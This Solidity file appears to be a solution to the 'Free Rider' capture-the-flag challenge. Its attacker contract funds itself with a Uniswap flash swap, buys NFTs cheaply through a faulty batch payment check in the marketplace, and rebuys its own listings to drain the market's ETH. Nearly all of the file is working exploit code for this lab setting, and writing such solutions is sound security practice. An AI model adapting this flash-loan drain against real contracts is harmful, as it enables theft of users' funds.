// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IERC20.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "./FreeRiderRecovery.sol";
import "../Attacker.sol";

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint wad) external;
}

interface UniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IFreeRiderNFTMarketplace {
    function offersCount() external view returns (uint256);
    function offerMany(uint256[] memory tokenIds, uint256[] memory prices) external;
    function buyMany(uint256[] memory tokenIds) external payable;
}

contract FreeRiderAttacker is Attacker, UniswapV2Callee, IERC721Receiver {
    IERC20 private immutable _token;
    IWETH private immutable _weth;
    IERC721 private immutable _nft;
    IUniswapV2Pair private immutable _uniswapPair;
    IFreeRiderNFTMarketplace private immutable _nftMarketplace;
    FreeRiderRecovery private immutable _recovery;

    constructor(address tokenAddress, address wethAddress, address nftAddress, address uniswapPairAddress, address nftMarketplaceAddress, address recoveryAddress) {
        _token = IERC20(tokenAddress);
        _weth = IWETH(wethAddress);
        _nft = IERC721(nftAddress);
        _uniswapPair = IUniswapV2Pair(uniswapPairAddress);
        _nftMarketplace = IFreeRiderNFTMarketplace(nftMarketplaceAddress);
        _recovery = FreeRiderRecovery(recoveryAddress);
    }

    function getDynamicArray(uint8 isPrice, uint8 length) private pure returns (uint256[] memory) {
        // Dumb function to help with dynamic arrays
        uint256[] memory tokenIds = new uint256[](isPrice == 1 ? 2 : length);
        if (isPrice == 1) {
            tokenIds[0] = 30 ether;
            tokenIds[1] = 15 ether;
            return tokenIds;
        } 
        for (uint256 i = 0; i < length;) {
            tokenIds[i] = i;
            unchecked {
                ++i;
            }
        }
        return tokenIds;
    }

    function startAttack() external override onlyOwner {
        address thisAddress = address(this);
        address recoveryAddress = address(_recovery);

        // Getting a flash loan to drain the market off of the NFTs
        _uniswapPair.swap(15 * 10 ** 18,0, thisAddress, "0x539"); // 1337

        // Giving the NFTs to the recovery contract
        for (uint256 i = 0; i < 6;) {
            _nft.safeTransferFrom(thisAddress, recoveryAddress, i, abi.encode(thisAddress));
            unchecked {
                ++i;
            }
        }

        // Giving the player ~~135.05 ETH
        payable(owner()).transfer(thisAddress.balance);
    }

    function uniswapV2Call(address sender, uint amount0, uint, bytes calldata) external override {
        // Converting the wrapped ETH to normal ETH
        _weth.withdraw(amount0);

        // Buying the NFTs from the marketplace
        _nftMarketplace.buyMany{value: 15 ether}(getDynamicArray(0, 6));

        // Appoving the market to sell the NFTs so we can drain it completely
        _nft.setApprovalForAll(address(_nftMarketplace), true);

        // Selling the NFTs to the marketplace
        _nftMarketplace.offerMany(getDynamicArray(0, 2),getDynamicArray(1, 0));
        // Buying my own NFTs, exploiting the market in the process to get my remaining ETH back
        _nftMarketplace.buyMany{value: 30 ether}(getDynamicArray(0, 2));

        // Repaying the flash loan
        _weth.deposit{value: 15046 * 10 ** 15}();
        _weth.transfer(address(_uniswapPair), _weth.balanceOf(sender));
    }

    function onERC721Received(address, address, uint256, bytes calldata)
        pure
        external
        override
        returns (bytes4)
    {
        // Getting my NFTs from the marketplace
        return this.onERC721Received.selector;
    }

}